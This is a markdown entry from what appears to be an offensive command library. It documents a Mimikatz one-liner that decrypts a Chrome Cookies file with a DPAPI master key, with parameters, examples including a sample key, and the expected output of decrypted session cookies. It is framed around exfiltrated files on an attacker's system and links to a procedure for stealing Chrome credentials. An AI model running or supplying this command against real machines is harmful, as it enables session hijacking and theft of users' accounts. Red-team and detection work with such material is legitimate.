---
type: command
executor: cmd
data: >-
  mimikatz.exe "dpapi::chrome
  /in:\"C:\\Users\\%USERNAME%\\AppData\\Local\\Google\\Chrome\\User
  Data\\Default\\Cookies\" /masterkey:$_MASTERKEY" "exit"
output: null
created_at: '2023-10-01T00:00:00Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Windows
tags:
  - mimikatz
  - dpapi
  - chrome
  - credential-access
verified: true
validated: true
---

# mimikatz-decrypt-chrome-cookies-with-masterkey

## Command

```cmd
mimikatz.exe "dpapi::chrome /in:\"C:\\Users\\%USERNAME%\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies\" /masterkey:$_MASTERKEY" "exit"
```

## Description

This command uses Mimikatz to decrypt a Chrome Cookies file using a provided master key, suitable for offline analysis of exfiltrated files. The master key must be previously extracted from the user's DPAPI masterkeys directory.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `%USERNAME%` | Environment variable for current user (auto-resolved) | Yes |
| `/in:"..."` | Full path to the Cookies file (use drive letter for offline) | Yes |
| `/masterkey:$_MASTERKEY` | Hex string of the DPAPI master key | Yes |
| `$_MASTERKEY` | Placeholder for the 64-character hex master key | Yes |
| `exit` | Quit Mimikatz after execution | Yes |

## Examples

### Basic Usage

```cmd
mimikatz.exe "dpapi::chrome /in:\"C:\\Users\\%USERNAME%\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies\" /masterkey:9a6f199e3d2e698ce78fdeeefadc85c527c43b4e3c5518c54e95718842829b12912567ca0713c4bd0cf74743c81c1d32bbf10020c9d72d58c99e731814e4155b" "exit"
```

### Advanced Usage

For a copied file on attacker's system:

```cmd
mimikatz.exe "dpapi::chrome /in:\"exfiltrated_cookies.db\" /masterkey:$_MASTERKEY" "exit"
```

## Expected Output

Successful decryption shows:

```
Cookie file : 'C:\...\Cookies' ok
* HOST : .example.com
  NAME : SESSION
  VALUE : decryptedvalue...
  ...
[+] Cookies decrypted with masterkey
```

Invalid key results in "ERROR decrypt with GUID/key ;"

## Related

- [[procedures/Steal-Chrome-Cookies-and-Credentials-with-Mimikatz]]
- [[tools/Mimikatz]]
